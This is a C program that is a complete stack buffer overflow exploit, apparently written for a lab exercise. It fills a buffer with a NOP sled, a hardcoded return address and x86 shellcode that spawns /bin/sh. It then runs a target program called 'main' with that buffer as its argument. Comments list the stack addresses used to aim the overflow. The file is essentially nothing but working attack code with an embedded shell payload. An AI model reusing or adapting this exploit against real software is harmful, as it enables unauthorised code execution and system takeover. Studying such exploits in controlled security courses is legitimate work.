 #include<stdio.h>

#define NOP 0x90
#define length 1080
#define RET 0xbfffeb50
//0xbfffeb50 // memory address of the S buffer in main
//0xbfffef70 //address of the s	 in the main program.
//0xbffff3f4 //address of the agrv in the main program.
//0xbfffef60 //memory add of BUFFER var.


main()
{
int h;
char buffer[length];
long returnAdress=RET;
static char shellcode[]="\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";


printf("this is the adress of the buffer %p \n",buffer);

for(h=0;h<length;h+=4)
	*(long *)&buffer[h]=RET;	

for(h=0;h<(length-strlen(shellcode)-300);h++)
	buffer[h]=NOP;

memcpy(buffer+h,shellcode,strlen(shellcode));

execlp("main","main", buffer,NULL);

}